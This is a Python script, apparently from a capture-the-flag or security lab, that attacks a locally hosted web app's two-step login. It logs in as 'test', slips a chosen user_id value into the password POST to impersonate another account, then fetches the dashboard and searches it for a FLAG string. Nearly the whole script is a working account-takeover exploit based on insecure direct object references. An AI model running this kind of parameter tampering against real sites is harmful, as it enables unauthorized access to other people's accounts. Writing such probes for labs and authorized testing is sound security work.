import requests
import re

base_url = "http://127.0.0.1:32883"

# Test a single user_id with detailed logging
user_id = 10025  # Example ID

print(f"[*] Testing user_id={user_id} with detailed flow tracking\n")

session = requests.Session()

# Step A: POST username
print("=== STEP A: POST username ===")
step_a_data = {'username': 'test'}
resp_a = session.post(f"{base_url}/", data=step_a_data, allow_redirects=False)
print(f"Status: {resp_a.status_code}")
print(f"Headers: {dict(resp_a.headers)}")
print(f"Cookies: {dict(session.cookies)}")
print(f"Response body: {resp_a.text}")

# Follow redirect manually if 302
if resp_a.status_code == 302:
    redirect_url = resp_a.headers.get('Location', '')
    print(f"\nRedirect to: {redirect_url}")
    if not redirect_url.startswith('http'):
        redirect_url = f"{base_url}{redirect_url}"
    resp_a_redirect = session.get(redirect_url)
    print(f"After redirect - Status: {resp_a_redirect.status_code}")
    print(f"Cookies: {dict(session.cookies)}")

# Step C: POST password with user_id
print("\n=== STEP C: POST password with user_id ===")
step_c_data = {
    'username': 'test',
    'password': 'test',
    'user_id': str(user_id)
}
resp_c = session.post(f"{base_url}/password/test", data=step_c_data, allow_redirects=False)
print(f"Status: {resp_c.status_code}")
print(f"Headers: {dict(resp_c.headers)}")
print(f"Cookies: {dict(session.cookies)}")
print(f"Response body: {resp_c.text}")

# Follow redirect if 302
if resp_c.status_code == 302:
    redirect_url = resp_c.headers.get('Location', '')
    print(f"\nRedirect to: {redirect_url}")
    if not redirect_url.startswith('http'):
        redirect_url = f"{base_url}{redirect_url}"
    resp_c_redirect = session.get(redirect_url, allow_redirects=False)
    print(f"After redirect - Status: {resp_c_redirect.status_code}")
    print(f"Cookies: {dict(session.cookies)}")
    if resp_c_redirect.status_code == 200:
        print(f"Response body: {resp_c_redirect.text}")

# Step D: GET dashboard
print("\n=== STEP D: GET dashboard ===")
resp_d = session.get(f"{base_url}/dashboard", allow_redirects=False)
print(f"Status: {resp_d.status_code}")
print(f"Headers: {dict(resp_d.headers)}")
print(f"Cookies: {dict(session.cookies)}")
print(f"Response body: {resp_d.text}")

# Check for FLAG
flag_match = re.search(r'FLAG\{[^}]+\}', resp_d.text)
if flag_match:
    print(f"\n[!] FLAG FOUND: {flag_match.group(0)}")

# If redirected, follow to see where
if resp_d.status_code == 302:
    redirect_url = resp_d.headers.get('Location', '')
    print(f"\nDashboard redirects to: {redirect_url}")
    if not redirect_url.startswith('http'):
        redirect_url = f"{base_url}{redirect_url}"
    resp_d_redirect = session.get(redirect_url)
    print(f"After redirect - Status: {resp_d_redirect.status_code}")
    print(f"Response body preview: {resp_d_redirect.text[:500]}")

print("\n" + "="*80)

